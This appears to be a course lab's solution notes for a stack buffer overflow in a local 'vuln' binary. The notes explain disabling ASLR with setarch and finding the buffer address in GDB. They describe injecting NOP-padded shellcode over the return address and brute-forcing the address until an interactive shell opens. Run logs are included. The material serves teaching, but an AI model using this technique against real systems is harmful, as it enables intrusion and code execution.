This task is already solved. Disassemble the `vuln` executable, see where the buffer overflow happens and what is the offset from the buffer start to the return address. The executable is compiled with the `-zexecstack option` such that the stack is executable and we can inject binary code.

   The `exploit.py` script exploits the current executable and gets you a shell; the script crafts a shellcode and then injects it in the buffer and then overwrites the return address with the start of the buffer. The script has to be run into a non-ASLR environment. In order to create that, run the command below to create a non-ASLR shell:

   ::

       setarch $(uname -m) -R /bin/bash

   As you can't really know the precise address of the buffer, we use `NOP` instructions as padding in the buffer and we have to do a bit of randomizing to guess the start address of the buffer. This is because, although ASLR is disabled, the buffer address is affected by the environment. So we have to do a bit of matching. For that you have to change the first 5 nibbles (hexadecimal digits) in line `32` in `exploit.py` from `0xffffd` to the likely address. For that to happen, find the buffer address in GDB:

   ::

      razvan@einherjar:~/.../tasks/src/use-shellcode$ gdb -q ./vuln
      Reading symbols from ./vuln...done.
      gdb-peda$ start
      [...]
      gdb-peda$ b reader
      Breakpoint 2 at 0x804849c: file vuln.c, line 8.
      gdb-peda$ c
      Continuing.
      Greetings, your liege!
      [...]
      Breakpoint 2, reader () at vuln.c:8
      8     printf("gimme message: ");
      gdb-peda$ p $esp
      $1 = (void *) 0xffffcf70

   The last value (`0xffffcf70`) is the approximate value of the buffer (that's where the stack pointer is after the prologue of the `reader` function). As the stack is likely larger in GDB (`0xffffcf70`) we use a slightly lower address in the `exploit.py` script (`0xffffd000`).

   **Update** line `32` in the `exploit.py` script with the proper value from the GDB inspection.

   Now run the script and wait a bit for it to jump to the proper address on the stack (through randomization), same as below. It should take no more than 2-3 minutes.

   ::

      razvan@einherjar:~/.../tasks/src/use-shellcode$ python exploit.py
      [+] Starting local process './vuln': Done
      Using address 0xffffd8b0
      [*] Process './vuln' stopped with exit code -11
      [...]
      [+] Starting local process './vuln': Done
      Using address 0xffffdbe0
      [*] Process './vuln' stopped with exit code -11
      [+] Starting local process './vuln': Done
      Using address 0xffffd5f0
      [*] Process './vuln' stopped with exit code -11
      [+] Starting local process './vuln': Done
      Using address 0xffffd040
      [*] Switching to interactive mode
      $ ls
      Makefile  core    exploit.py  vuln  vuln.c  vuln.o

